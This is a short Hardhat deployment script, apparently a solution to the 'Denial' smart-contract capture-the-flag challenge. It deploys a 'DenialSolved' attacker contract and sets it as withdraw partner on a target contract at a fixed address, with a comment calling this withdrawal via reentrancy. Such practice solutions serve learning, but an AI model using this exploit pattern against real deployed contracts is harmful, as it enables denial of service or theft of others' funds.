// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
// When running the script with `hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther, parseUnits } from 'ethers/lib/utils';
import { ethers } from 'hardhat';


async function main(): Promise<void> {
  // Hardhat always runs the compile task when running scripts through it.
  // If this runs in a standalone fashion you may want to call compile manually
  // to make sure everything is compiled
  // await run("compile");
  // We get the contract to deploy
  const [deployer] = await ethers.getSigners();
  const denialAddress = "0x64123fA4Af038fD7973C022c9Affa5E4aa4637C1"
  console.log(deployer.address);

  const DenialFactory = await ethers.getContractFactory("Denial");
  const DenialSolvedFactory = await ethers.getContractFactory("DenialSolved");

  const denial = DenialFactory.attach(denialAddress);  
  
  const denialSolved = await DenialSolvedFactory.deploy();
  await denialSolved.deployed()
  console.log('denialSolved deployed to: ', denialSolved.address);
  
  // now withdraw funds via reentrancy
  const tx = await denial.setWithdrawPartner(denialSolved.address)
  console.log(tx)
  const receipt = await tx.wait()
  console.log(receipt)
} 

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error: Error) => {
    console.error(error);
    process.exit(1);
  });
